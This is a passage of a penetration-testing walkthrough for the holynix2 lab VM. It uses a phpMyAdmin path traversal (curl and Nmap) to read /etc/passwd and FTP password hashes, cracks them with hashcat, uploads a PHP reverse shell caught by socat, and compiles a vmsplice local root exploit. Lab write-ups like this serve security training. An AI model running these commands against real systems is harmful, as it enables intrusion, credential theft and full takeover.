<span class="go">|   bzimmerman:x:1018:2002::/home/bzimmerman:/bin/false</span>
<span class="go">|   ncobol:x:1019:2002::/home/ncobol:/bin/false</span>
<span class="go">|   ddypsky:x:1020:2002::/home/ddypsky:/bin/false</span>
<span class="go">|   rcropper:x:1021:2002::/home/rcropper:/bin/false</span>
<span class="go">|   cbergey:x:1022:2002::/home/cbergey:/bin/false</span>
<span class="go">|   tmartin:x:1023:2002::/home/tmartin:/bin/false</span>
<span class="go">|   jgacy:x:1024:2002::/home/jgacy:/bin/false</span>
<span class="go">|   splath:x:1025:2002::/home/splath:/bin/false</span>
<span class="go">|   evorhees:x:1026:2002::/home/evorhees:/bin/false</span>
<span class="go">|   rfrost:x:1027:2002::/home/rfrost:/bin/false</span>
<span class="go">|   ahuxley:x:1028:2002::/home/ahuxley:/bin/false</span>
<span class="go">|   webmaster:x:1029:2002::/var/www:/bin/false</span>
<span class="go">|   cmanson:x:1030:2002::/home/cmanson:/bin/false</span>
<span class="go">|   vftp:x:1031:2002:Virtual FTP User:/dev/null:/bin/false</span>
<span class="go">|   ../../../../../etc/passwd saved to passwd.txt</span>
<span class="go">|</span>
<span class="go">|     References:</span>
<span class="go">|       http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3299</span>
<span class="go">|_      http://www.exploit-db.com/exploits/1244/</span>

<span class="go">Nmap done: 1 IP address (1 host up) scanned in 0.19 seconds</span>
</pre></div>
</div>
<p>The <strong class="program">curl</strong> equivalent is simply:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span>curl http://<span class="nv">$T</span>/phpMyAdmin/libraries/grab_globals.lib.php? <span class="se">\</span>
  --data usesubform<span class="o">[</span><span class="m">1</span><span class="o">]=</span><span class="m">1</span> <span class="se">\</span>
  --data subform<span class="o">[</span><span class="m">1</span><span class="o">][</span>redirect<span class="o">]=</span><span class="s2">&quot;../../../../../etc/passwd&quot;</span>
</pre></div>
</div>
</div>
<div class="section" id="phpmyadmin-lets-you-download-vulnerable-files-without-a-cve">
<h5>3.16.2.3.4.4. phpMyAdmin lets you download vulnerable files without a CVE<a class="headerlink" href="#phpmyadmin-lets-you-download-vulnerable-files-without-a-cve" title="Permalink to this headline">¶</a></h5>
<p>You don’t need a vulnerability to get an arbitrary file from phpMyAdmin. Just open up <a class="reference external" href="http://www.zincftp.com/phpMyAdmin/db_details_structure.php?db=zincftp%3Fdata">http://www.zincftp.com/phpMyAdmin/db_details_structure.php?db=zincftp%3Fdata</a> and create a new table named passwords with 1 field. On the resulting web page, name the field “password” of length (say) 100 and select “Save”. In the resulting web page change the query to “load data local infile ‘/etc/passwd’ into table passwords;” then select “Go”. (For MySQL syntax details see <a class="reference external" href="https://dev.mysql.com/doc/refman/5.0/en/load-data.html">13.2.6 LOAD DATA INFILE Syntax</a>.) To download the file select Export at the top, then in the resulting web page select “CSV”, “Save as file”, then select “Go”.</p>
<p>For utter simplicity we’ll use the <code class="docutils literal"><span class="pre">curl</span></code> vulnerability exploitation command above, knowing that there is an equivalent that can be used when the vulnerability is not available.</p>
</div>
</div>
</div>
<div class="section" id="comparing-the-ftp-users-to-etc-passwd-users">
<h3>3.16.2.4. Comparing the FTP users to /etc/passwd users<a class="headerlink" href="#comparing-the-ftp-users-to-etc-passwd-users" title="Permalink to this headline">¶</a></h3>
<div class="section" id="only-5-ftp-users-can-ssh">
<h4>3.16.2.4.1. Only 5 FTP users can SSH<a class="headerlink" href="#only-5-ftp-users-can-ssh" title="Permalink to this headline">¶</a></h4>
<p>Let’s see which of the FTP users actually can log on via SSH:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nb">cd</span> <span class="nv">$PT</span>/passwords
grep <span class="s1">&#39;/bin/bash&#39;</span> passwd.txt <span class="p">|</span> grep -v <span class="s1">&#39;^root&#39;</span> <span class="p">|</span> cut -d: -f1
</pre></div>
</div>
<p>Running this shows the 5 FTP users that are also SSH users:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/holynix2/users$ cd $</span>PT/passwords
<span class="gp">hacker@kali:~/pentest/holynix2/users$</span> grep <span class="s1">&#39;/bin/bash&#39;</span> passwd.txt <span class="p">|</span> grep -v <span class="s1">&#39;^root&#39;</span> <span class="p">|</span> cut -d: -f1
<span class="go">lsanderson</span>
<span class="go">cfinnerly</span>
<span class="go">ddonnovan</span>
<span class="go">skrymple</span>
<span class="go">amckinley</span>
</pre></div>
</div>
</div>
<div class="section" id="get-pureftp-password-hashes-via-phpmyadmin">
<h4>3.16.2.4.2. Get PureFTP password hashes via phpMyAdmin<a class="headerlink" href="#get-pureftp-password-hashes-via-phpmyadmin" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://help.ubuntu.com/community/PureFTP">PureFTP</a> shows the default location for Ubuntu’s pure-ftpd package password file is <code class="file docutils literal"><span class="pre">/etc/pure-ftpd/pureftpd.passwd</span></code>. We know we can get the hashes via:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nb">cd</span> <span class="nv">$PT</span>/passwords
curl --silent --output pureftpd.passwd <span class="se">\</span>
  http://<span class="nv">$T</span>/phpMyAdmin/libraries/grab_globals.lib.php? <span class="se">\</span>
  --data usesubform<span class="o">[</span><span class="m">1</span><span class="o">]=</span><span class="m">1</span> <span class="se">\</span>
  --data subform<span class="o">[</span><span class="m">1</span><span class="o">][</span>redirect<span class="o">]=</span><span class="s2">&quot;../../../../../etc/pure-ftpd/pureftpd.passwd&quot;</span>
cat pureftpd.passwd
</pre></div>
</div>
<p>Running this gives:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/holynix2/passwords$ cd $</span>PT/passwords
<span class="gp">hacker@kali:~/pentest/holynix2/passwords$</span> curl --silent --output pureftpd.passwd <span class="se">\</span>
&gt;   http://<span class="nv">$T</span>/phpMyAdmin/libraries/grab_globals.lib.php? <span class="se">\</span>
&gt;   --data usesubform<span class="o">[</span><span class="m">1</span><span class="o">]=</span><span class="m">1</span> <span class="se">\</span>
&gt;   --data subform<span class="o">[</span><span class="m">1</span><span class="o">][</span>redirect<span class="o">]=</span><span class="s2">&quot;../../../../../etc/pure-ftpd/pureftpd.passwd&quot;</span>
<span class="gp">hacker@kali:~/pentest/holynix2/passwords$</span> cat pureftpd.passwd
<span class="gp">cmahong:$1$vUW5q3t0$</span>9RZSkReNoWGCaPtL7ixLX0:1031:2002::/home/cmahong/./::::::::::::
<span class="gp">lnickerbacher:$1$yiEZKCE0$</span>BOuvM8nrfoNGWAcjPenpa.:1031:2002::/home/lnickerbacher/./::::::::::::
<span class="gp">jstreet:$1$sBGmOuB0$</span>TPHx0jBSFjtJu7dJXb4Nw/:1031:2002::/home/jstreet/./::::::::::::
<span class="gp">rwoo:$1$VZxDrE30$</span>p7NPDTkxuQhPSsLpi2a1H1:1031:2002::/home/rwoo/./::::::::::::
<span class="gp">cfinnerly:$1$dRGyIOy0$</span>OVGBtLHyxFjPg7tmxtvHY/:1031:2002::/home/cfinnerly/./::::::::::::
<span class="gp">kmccallum:$1$dijBzwn0$</span>qlGcbcTT0Qyg8wQf4.QiG1:1031:2002::/home/kmccallum/./::::::::::::
<span class="gp">cjalong:$1$FVj4if60$</span>BWSIDiE97oTKUs70qOjZx/:1031:2002::/home/cjalong/./::::::::::::
<span class="gp">jsmith:$1$yQKaOpR0$</span>UdySwRtPd1upTckQ5/.CM/:1031:2002::/home/jsmith/./::::::::::::
<span class="gp">lsanderson:$1$gzIP52U0$</span>cL6XE61yDZD0unvIIkV8l/:1031:2002::/home/lsanderson/./::::::::::::
<span class="gp">dhammond:$1$yK9OuzZ0$</span>W7mgvS4SisxP1BwdLsuy1/:1031:2002::/home/dhammond/./::::::::::::
<span class="gp">hmcknight:$1$A07SpdB0$</span>hs/m8KyoJyY3gVAhlWDQI/:1031:2002::/home/hmcknight/./::::::::::::
<span class="gp">lwestre:$1$.R5Dbl60$</span>n2ajoJce/LnPVCq497sUQ.:1031:2002::/home/lwestre/./::::::::::::
<span class="gp">gwelch:$1$/uYT22Y0$</span>njR3vmLQrbnAugwkNLgJ5/:1031:2002::/home/gwelch/./::::::::::::
<span class="gp">dmoran:$1$JZrJXdU0$</span>ORe5.yRgQHCQl6h14rEEe.:1031:2002::/home/dmoran/./::::::::::::
<span class="gp">dsummers:$1$VXo3pWp0$</span>v0J7NsxRhDy/ufU01P/ch1:1031:2002::/home/dsummers/./::::::::::::
<span class="gp">bzimmerman:$1$rQep6B90$</span>ZtnoFZpTEBkNoRCfqJRpe/:1031:2002::/home/bzimmerman/./::::::::::::
<span class="gp">amckinley:$1$45Bz0af0$</span>Fsfo.XXcLkVzSaH5bLjzI0:1031:2002::/home/amckinley/./::::::::::::
<span class="gp">ncobol:$1$q.xxgp70$</span>645DFncdOFc24n93la5a70:1031:2002::/home/ncobol/./::::::::::::
<span class="gp">ddypsky:$1$ccUhlpJ0$</span>PO/WATKUekwaPct4zXeV9.:1031:2002::/home/ddypsky/./::::::::::::
<span class="gp">rcropper:$1$Qhw2Vff0$</span>QDvQMEe9CGFwVrvVUPqTz0:1031:2002::/home/rcropper/./::::::::::::
<span class="gp">ddonnovan:$1$1z2APl80$</span>uAyYFZLPu/WRkkpegD3Ht.:1031:2002::/home/ddonnovan/./::::::::::::
<span class="gp">cbergey:$1$MOwY3Ie0$</span>LcgARpcVk8Hf8n.E7itC40:1031:2002::/home/cbergey/./::::::::::::
<span class="gp">tmartin:$1$3jpH7Yk0$</span>2XmRv6acGEkBjmNQeyzUz.:1031:2002::/home/tmartin/./::::::::::::
<span class="gp">jgacy:$1$b.0bYDi0$</span>sSMXaRDSZu8YvWVz.wfCo0:1031:2002::/home/jgacy/./::::::::::::
<span class="gp">splath:$1$jbdcsaj0$</span>7uaXto3yRZWwDp5VEbJQV/:1031:2002::/home/splath/./::::::::::::
<span class="gp">skrymple:$1$zjyNa1C0$</span>x2JA4Tm61q3N0Fq06gXun1:1031:2002::/home/skrymple/./::::::::::::
<span class="gp">evorhees:$1$ITHWZZd0$</span>Qhs38Q7QpRTe./Npk25hu/:1031:2002::/home/evorhees/./::::::::::::
<span class="gp">rfrost:$1$3Nqexaj0$</span>eJv5nfOYM71jvlTEA1iv..:1031:2002::/home/rfrost/./::::::::::::
<span class="gp">ahuxley:$1$ObpCAT60$</span>LTqCcrqMGAgv8YMyva5Sr0:1031:2002::/home/ahuxley/./::::::::::::
<span class="gp">cmanson:$1$gMHNCq70$</span>RCOXC8pfElSRvh5BFc5fF0:1031:2002::/home/cmanson/./::::::::::::
<span class="gp">webmaster:$1$v2tdHOX0$</span>MnLOX4cXqZYL99QbDDZ/1/:1031:2002::/var/www/./::::::::::::
</pre></div>
</div>
<p>Note that even if we crack these passwords, they only give us FTP access, not SSH access. But FTP access allows uploading a reverse php shell to get shell access.</p>
</div>
</div>
</div>
<div class="section" id="the-exploit">
<h2>3.16.3. The Exploit<a class="headerlink" href="#the-exploit" title="Permalink to this headline">¶</a></h2>
<p>We’re ready to start our exploit. When we’re done we’ll have to remember to switch DNS resolution back, then undo the impersonation:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># undo the the networking changes</span>
<span class="nv">$SUDO</span> ip route del <span class="nv">$T</span>/32
ip route show
<span class="nv">$SUDO</span> ip addr del <span class="nv">$TRUSTED</span> dev <span class="nv">$IF</span>
ip addr show <span class="nv">$IF</span>
</pre></div>
</div>
<p>But don’t do that just yet.</p>
<div class="section" id="the-plan">
<h3>3.16.3.1. The plan<a class="headerlink" href="#the-plan" title="Permalink to this headline">¶</a></h3>
<p>Our goal is root and there are 2 basic possibilities: via SSH or FTP.</p>
<ul>
<li><p class="first">SSH</p>
<p>SSH seems like the more direct route but requires online password cracking, which is notoriously slow and relies on weak passwords. Of the 30 userid’s harvested from DNS, only 5 have shell access and their passwords are safely tucked away in <code class="file docutils literal"><span class="pre">/etc/shadow</span></code>. We could attempt to crack their FTP hashes with hopes that their SSH passwords are the same. Unfortunately, a 4 hour offline run only succeeded in cracking 3 of the 30 FTP hashes and none of those were for users who had shell access.</p>
</li>
<li><p class="first">FTP</p>
<p>The idea here is to FTP up a reverse shell to get basic shell access, then run an exploit to get root. Before we can use FTP a valid userid/password is required. We already have the FTP password hashes for password cracking; only 1 weak password out of 30 is needed to exploit a reverse PHP shell.</p>
</li>
</ul>
</div>
<div class="section" id="cracking-the-ftp-password-hashes">
<h3>3.16.3.2. Cracking the FTP password hashes<a class="headerlink" href="#cracking-the-ftp-password-hashes" title="Permalink to this headline">¶</a></h3>
<p>We could use <strong class="program">john</strong> or <strong class="program">hashcat</strong> to crack the passwords. We’ll use <code class="file docutils literal"><span class="pre">/usr/share/wordlists/rockyou.</span> <span class="pre">:program:`john</span></code> works directly with <code class="file docutils literal"><span class="pre">pureftpd.passwd</span></code> while <strong class="program">hashcat</strong> requires identifying the hash type (500) with the input file having the hash field only.</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nb">cd</span> <span class="nv">$PT</span>/passwords
zcat /usr/share/wordlists/rockyou.txt.gz &gt; rockyou.txt
<span class="c1"># running john is as simple as</span>
<span class="c1"># /usr/sbin/john --wordlist=rockyou.txt pureftpd.passwd | tee cracked-john.txt</span>
<span class="c1"># hashcat requires more work and (for the first run) saying YES to a license</span>
cut -d: -f2 pureftpd.passwd &gt; hashes.txt
<span class="nv">MODE</span><span class="o">=</span><span class="k">$(</span>head -n <span class="m">1</span> hashes.txt <span class="p">|</span> python2 <span class="k">$(</span>which hashid<span class="k">)</span> -m <span class="p">|</span> <span class="se">\</span>
    grep <span class="s1">&#39;Hashcat Mode:&#39;</span> <span class="p">|</span> head -n <span class="m">1</span> <span class="p">|</span> sed <span class="s1">&#39;s/^.*Hashcat Mode: //;s/]$//&#39;</span><span class="k">)</span>
hashcat --hash-type<span class="o">=</span><span class="nv">$MODE</span> hashes.txt rockyou.txt  <span class="p">|</span> tee cracked.txt
</pre></div>
</div>
<p>This quickly got the following password hash cracked. (Enter <code class="kbd docutils literal"><span class="pre">Control-c</span></code> after first password hash is cracked.):</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/holynix2/passwords$ cd $</span>PT/passwords
<span class="gp">hacker@kali:~/pentest/holynix2/passwords$</span> zcat /usr/share/wordlists/rockyou.txt.gz &gt; rockyou.txt
<span class="gp">hacker@kali:~/pentest/holynix2/passwords$ #</span> running john is as simple as
<span class="gp">hacker@kali:~/pentest/holynix2/passwords$ #</span> /usr/sbin/john --wordlist<span class="o">=</span>rockyou.txt pureftpd.passwd
<span class="gp">hacker@kali:~/pentest/holynix2/passwords$ #</span> hashcat requires more work
<span class="gp">hacker@kali:~/pentest/holynix2/passwords$</span> cut -d: -f2 pureftpd.passwd &gt; hashes.txt
<span class="gp">hacker@kali:~/pentest/holynix2/passwords$ MODE=$</span><span class="o">(</span>head -n <span class="m">1</span> hashes.txt <span class="p">|</span> python2 <span class="k">$(</span>which hashid<span class="k">)</span> -m <span class="p">|</span> <span class="se">\</span>
&gt;     grep <span class="s1">&#39;Hashcat Mode:&#39;</span> <span class="p">|</span> head -n <span class="m">1</span> <span class="p">|</span> sed <span class="s1">&#39;s/^.*Hashcat Mode: //;s/]$//&#39;</span><span class="o">)</span>
<span class="gp">hacker@kali:~/pentest/holynix2/passwords$</span> hashcat --hash-type<span class="o">=</span><span class="nv">$MODE</span> hashes.txt rockyou.txt  <span class="p">|</span> tee cracked.txt
<span class="go">Initializing hashcat v0.49 with 2 threads and 32mb segment-size...</span>

<span class="go">Added hashes from file hashes.txt: 31 (31 salts)</span>

<span class="go">NOTE: press enter for status-screen</span>

<span class="gp">$</span><span class="m">1</span><span class="nv">$3</span>jpH7Yk0<span class="nv">$2</span>XmRv6acGEkBjmNQeyzUz.:millionaire
<span class="go">^CTo restore Session use Parameter -s 64616</span>
</pre></div>
</div>
<p>So user tmartin has the password “millionaire”:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/holynix2/passwords$</span> grep <span class="s1">&#39;$1$3jpH7Yk0$2XmRv6acGEkBjmNQeyzUz.&#39;</span> pureftpd.passwd <span class="p">|</span> cut -d: -f1
<span class="go">tmartin</span>
</pre></div>
</div>
</div>
<div class="section" id="uploading-and-executing-the-php-reverse-shell">
<h3>3.16.3.3. Uploading and executing the php reverse shell<a class="headerlink" href="#uploading-and-executing-the-php-reverse-shell" title="Permalink to this headline">¶</a></h3>
<p>Let’s upload the php reverse shell:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">ATTACKER</span><span class="o">=</span><span class="m">192</span>.168.1.106
<span class="nv">PORT</span><span class="o">=</span><span class="m">9999</span>
<span class="nb">cd</span> <span class="nv">$PT</span>/exploit
<span class="nv">FTPUSER</span><span class="o">=</span>tmartin
<span class="nv">PASSWORD</span><span class="o">=</span>millionaire
<span class="c1"># Upload a php reverse shell</span>
<span class="nv">RSHELL</span><span class="o">=</span><span class="k">$(</span>locate php <span class="p">|</span> grep reverse <span class="p">|</span> tail --lines<span class="o">=</span><span class="m">1</span><span class="k">)</span>
<span class="nv">UPLOAD</span><span class="o">=</span>rshell.php
cp <span class="nv">$RSHELL</span> <span class="nv">$UPLOAD</span>
<span class="c1"># Modify reverse shell to connect to ATTACKER</span>
sed -i <span class="s2">&quot;s/\$ip = &#39;127.0.0.1&#39;/\$ip = &#39;</span><span class="nv">$ATTACKER</span><span class="s2">&#39;/&quot;</span> <span class="nv">$UPLOAD</span>
sed -i <span class="s2">&quot;s/\$port = 1234/\$port = </span><span class="nv">$PORT</span><span class="s2">/&quot;</span> <span class="nv">$UPLOAD</span>
curl --silent --upload-file <span class="nv">$UPLOAD</span> <span class="se">\</span>
     --user <span class="nv">$FTPUSER</span>:<span class="nv">$PASSWORD</span>  ftp://<span class="nv">$T</span>/web/
<span class="c1"># The uploaded shell is at http://$FTPUSER.zincftp.com/~tmartin/rshell.php</span>
</pre></div>
</div>
<p>Running this gives us:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/holynix2/exploit$</span> <span class="nv">ATTACKER</span><span class="o">=</span><span class="m">192</span>.168.1.106
<span class="gp">hacker@kali:~/pentest/holynix2/exploit$</span> <span class="nv">PORT</span><span class="o">=</span><span class="m">9999</span>
<span class="gp">hacker@kali:~/pentest/holynix2/passwords$ cd $</span>PT/exploit
<span class="gp">hacker@kali:~/pentest/holynix2/exploit$</span> <span class="nv">FTPUSER</span><span class="o">=</span>tmartin
<span class="gp">hacker@kali:~/pentest/holynix2/exploit$</span> <span class="nv">PASSWORD</span><span class="o">=</span>millionaire
<span class="gp">hacker@kali:~/pentest/holynix2/exploit$ #</span> Upload a php reverse shell
<span class="gp">hacker@kali:~/pentest/holynix2/exploit$ RSHELL=$</span><span class="o">(</span>locate php <span class="p">|</span> grep reverse <span class="p">|</span> tail --lines<span class="o">=</span><span class="m">1</span><span class="o">)</span>
<span class="gp">hacker@kali:~/pentest/holynix2/exploit$</span> <span class="nv">UPLOAD</span><span class="o">=</span>rshell.php
<span class="gp">hacker@kali:~/pentest/holynix2/exploit$ cp $</span>RSHELL <span class="nv">$UPLOAD</span>
<span class="gp">hacker@kali:~/pentest/holynix2/exploit$ #</span> Modify reverse shell to connect to ATTACKER
<span class="gp">hacker@kali:~/pentest/holynix2/exploit$</span> sed -i <span class="s2">&quot;s/\$ip = &#39;127.0.0.1&#39;/\$ip = &#39;</span><span class="nv">$ATTACKER</span><span class="s2">&#39;/&quot;</span> <span class="nv">$UPLOAD</span>
<span class="gp">hacker@kali:~/pentest/holynix2/exploit$</span> sed -i <span class="s2">&quot;s/\$port = 1234/\$port = </span><span class="nv">$PORT</span><span class="s2">/&quot;</span> <span class="nv">$UPLOAD</span>
<span class="gp">hacker@kali:~/pentest/holynix2/exploit$</span> curl --silent --upload-file <span class="nv">$UPLOAD</span> <span class="se">\</span>
&gt;      --user <span class="nv">$FTPUSER</span>:<span class="nv">$PASSWORD</span>  ftp://<span class="nv">$T</span>/web/
<span class="gp">hacker@kali:~/pentest/holynix2/exploit$ #</span> The uploaded shell is at http://<span class="nv">$FTPUSER</span>.zincftp.com/~tmartin/rshell.php
</pre></div>
</div>
<p>Now open up a listener in a separate window:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PORT</span><span class="o">=</span><span class="m">9999</span>
socat - tcp-listen:<span class="nv">$PORT</span>
</pre></div>
</div>
<p>Then fire off the reverse shell. Note that this requires you to use the DNS server $T. More recent versions of <strong class="program">curl</strong> have a “–dns-servers” option, but Kali has an old version lacking this.</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># Remember to update DNS to use nameserver $T</span>
<span class="c1"># Or edit /etc/hosts to add &#39;192.168.1.88 tmartin.zincftp.com&#39;</span>
curl --silent http://<span class="nv">$FTPUSER</span>.zincftp.com/rshell.php
</pre></div>
</div>
<p>If DNS is set up properly you should see a shell open up in to “socat” listener window:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/holynix2/exploit$</span> socat - tcp-listen:9999
<span class="go">Linux holynix2 2.6.22-14-server #1 SMP Sun Oct 14 23:34:23 GMT 2007 i686 GNU/Linux</span>
<span class="go"> 22:31:28 up  4:13,  1 user,  load average: 0.00, 0.00, 0.00</span>
<span class="go">USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT</span>
<span class="go">root     tty1     -                18:36    6:22m  0.22s  0.14s -bash</span>
<span class="go">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
<span class="go">/bin/sh: can&#39;t access tty; job control turned off</span>
</pre></div>
</div>
<p>As soon as you see the shell open up on the “socat” window you can <code class="kbd docutils literal"><span class="pre">Control-c</span></code> the <code class="docutils literal"><span class="pre">curl</span></code> command:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/holynix2/exploit$</span> curl --silent http://<span class="nv">$FTPUSER</span>.zincftp.com/rshell.php
<span class="go">^C</span>
</pre></div>
</div>
</div>
<div class="section" id="getting-to-root">
<h3>3.16.3.4. Getting to root<a class="headerlink" href="#getting-to-root" title="Permalink to this headline">¶</a></h3>
<p>A search for “ubuntu 8.04 kernel 2.6.22 exploit” hit <a class="reference external" href="https://bugs.launchpad.net/ubuntu/+source/linux-source-2.6.22/+bug/190587">Local root exploit in kernel 2.6.17 - 2.6.24 (vmsplice)</a>. The source code for vmsplice can be viewed online at <a class="reference external" href="https://www.exploit-db.com/exploits/5093/">Linux Kernel 2.6.23 &lt;= 2.6.24 - vmsplice Local Root Exploit</a> and other root exploits can be found at <a class="reference external" href="http://www.win.tue.nl/~aeb/linux/hh/hh-12.html">Hackers Hut 12. Local root exploits</a>. Download the following in the source file <a class="reference download internal" href="../_downloads/holynix2-exploit.c" download=""><code class="xref download docutils literal"><span class="pre">holynix2-exploit.c</span></code></a> to the $PT/exploit directory.</p>
<p>Upload the file via FTP</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nb">cd</span> <span class="nv">$PT</span>/exploit
<span class="nv">FTPUSER</span><span class="o">=</span>tmartin
<span class="nv">PASSWORD</span><span class="o">=</span>millionaire
<span class="c1"># Upload holynix2-exploit.c</span>
<span class="nv">UPLOAD</span><span class="o">=</span>holynix2-exploit.c
curl --silent --upload-file <span class="nv">$UPLOAD</span> <span class="se">\</span>
     --user <span class="nv">$FTPUSER</span>:<span class="nv">$PASSWORD</span>  ftp://<span class="nv">$T</span>/web/
</pre></div>
</div>
<p>Then in the socat listener window continue on in the reverse shell:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span>python -c <span class="s1">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
cp ~tmartin/web/holynix2-exploit.c /tmp/
<span class="nb">cd</span> /tmp
gcc holynix2-exploit.c -o exploit
./exploit
id
su - root
id
</pre></div>
</div>
<p>Running this gives:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">$</span> python -c <span class="s1">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
<span class="gp">www-data@holynix2:/$</span> cp ~tmartin/web/holynix2-exploit.c /tmp/
<span class="go">cp ~tmartin/web/holynix2-exploit.c /tmp/</span>
<span class="go">cd /tmp</span>
<span class="go">gcc holynix2-exploit.c -o exploit</span>
<span class="go">./exploit</span>
<span class="gp">www-data@holynix2:/$</span> <span class="nb">cd</span> /tmp
<span class="go">cd /tmp</span>
<span class="gp">www-data@holynix2:/tmp$</span> gcc holynix2-exploit.c -o exploit
<span class="go">gcc holynix2-exploit.c -o exploit</span>
<span class="gp">www-data@holynix2:/tmp$</span> ./exploit
<span class="go">./exploit</span>
<span class="go">-----------------------------------</span>
<span class="go"> Linux vmsplice Local Root Exploit</span>
<span class="go"> By qaaz</span>
<span class="go">-----------------------------------</span>
<span class="go">[+] mmap: 0x0 .. 0x1000</span>
<span class="go">[+] page: 0x0</span>
<span class="go">[+] page: 0x20</span>
<span class="go">[+] mmap: 0x4000 .. 0x5000</span>
<span class="go">[+] page: 0x4000</span>
<span class="go">[+] page: 0x4020</span>
<span class="go">[+] mmap: 0x1000 .. 0x2000</span>
<span class="go">[+] page: 0x1000</span>
<span class="go">[+] mmap: 0xb7db9000 .. 0xb7deb000</span>
<span class="go">[+] root</span>
<span class="gp">root@holynix2:/tmp#</span> id
<span class="go">id</span>
<span class="go">uid=0(root) gid=0(root) groups=33(www-data)</span>
<span class="gp">root@holynix2:/tmp#</span> su - root
<span class="go">su - root</span>
<span class="gp">root@holynix2:~#</span> id
<span class="go">id</span>
<span class="go">uid=0(root) gid=0(root) groups=0(root)</span>
</pre></div>
</div>
<p>And we are root.</p>
</div>
<div class="section" id="cleaning-up">
<h3>3.16.3.5. Cleaning up<a class="headerlink" href="#cleaning-up" title="Permalink to this headline">¶</a></h3>
<p>Unless you’re planning on doing the following pentest calisthenics, it’s time to clean up the network setup. First, change DNS resolution back to normal (probably editing <code class="file docutils literal"><span class="pre">/etc/resolv.conf</span></code>). Then remove any extra ip addresses and routing:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">IF</span><span class="o">=</span>eth0
<span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.88
<span class="nv">TRUSTED</span><span class="o">=</span><span class="m">192</span>.168.1.34
<span class="c1"># undo the the networking changes</span>
<span class="nv">$SUDO</span> ip route del <span class="nv">$T</span>/32
ip route show
<span class="nv">$SUDO</span> ip addr del <span class="nv">$TRUSTED</span> dev <span class="nv">$IF</span>
ip addr show <span class="nv">$IF</span>
</pre></div>
</div>
<p>And if you’re done with holynix2 you can shut down the host from your remote shell terminal.</p>
</div>
</div>
<div class="section" id="pentest-calisthenics-getting-the-user-list">
<h2>3.16.4. Pentest Calisthenics - Getting the User List<a class="headerlink" href="#pentest-calisthenics-getting-the-user-list" title="Permalink to this headline">¶</a></h2>
<div class="section" id="user-list-from-the-dns-axfr">
<h3>3.16.4.1. User list from the DNS axfr<a class="headerlink" href="#user-list-from-the-dns-axfr" title="Permalink to this headline">¶</a></h3>
<p>This is not needed for this exploit, but illustrates both a dead end the author took and some useful techniques.</p>
<p>First a little script-fu gets us our FTP users list from the DNS axfr file:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nb">cd</span> <span class="nv">$PT</span>/passwords
cut -d<span class="s1">$&#39;\t&#39;</span> -f1 ../dns/dns_axfr.txt <span class="p">|</span> <span class="se">\</span>
  sed <span class="s1">&#39;s/\.zincftp\.com\..*//&#39;</span> <span class="p">|</span> <span class="se">\</span>
  egrep -v <span class="s1">&#39;(^;|^dev$|^mta$|^ns1$|^ns2$|^trusted$|^www$|^zincftp\.com\.$|^$)&#39;</span> <span class="se">\</span>
  &gt; users.txt
</pre></div>
</div>
<p>From this we harvest these userids:</p>
<table border="1" class="docutils">
<colgroup>
<col width="100%" />
</colgroup>
<thead valign="bottom">
<tr class="row-odd"><th class="head">userid</th>
</tr>
</thead>
<tbody valign="top">
<tr class="row-even"><td>ahuxley</td>
</tr>
<tr class="row-odd"><td>amckinley</td>
</tr>
<tr class="row-even"><td>bzimmerman</td>
</tr>
<tr class="row-odd"><td>cbergey</td>
</tr>
<tr class="row-even"><td>cfinnerly</td>
</tr>
<tr class="row-odd"><td>cjalong</td>
</tr>
<tr class="row-even"><td>cmahong</td>
</tr>
<tr class="row-odd"><td>cmanson</td>
</tr>
<tr class="row-even"><td>ddonnovan</td>
</tr>
<tr class="row-odd"><td>ddypsky</td>
</tr>
<tr class="row-even"><td>dhammond</td>
</tr>
<tr class="row-odd"><td>dmoran</td>
</tr>
<tr class="row-even"><td>dsummers</td>
</tr>
<tr class="row-odd"><td>evorhees</td>
</tr>
<tr class="row-even"><td>gwelch</td>
</tr>
<tr class="row-odd"><td>hmcknight</td>
</tr>
<tr class="row-even"><td>jgacy</td>
</tr>
<tr class="row-odd"><td>jsmith</td>
</tr>
<tr class="row-even"><td>jstreet</td>
</tr>
<tr class="row-odd"><td>kmccallum</td>
</tr>
<tr class="row-even"><td>lnickerbacher</td>
</tr>
<tr class="row-odd"><td>lsanderson</td>
</tr>
<tr class="row-even"><td>lwestre</td>
</tr>
<tr class="row-odd"><td>ncobol</td>
</tr>
<tr class="row-even"><td>rcropper</td>
</tr>
<tr class="row-odd"><td>rfrost</td>
</tr>
<tr class="row-even"><td>rwoo</td>
</tr>
<tr class="row-odd"><td>skrymple</td>
</tr>
<tr class="row-even"><td>splath</td>
</tr>
<tr class="row-odd"><td>tmartin</td>
</tr>
</tbody>
</table>
</div>
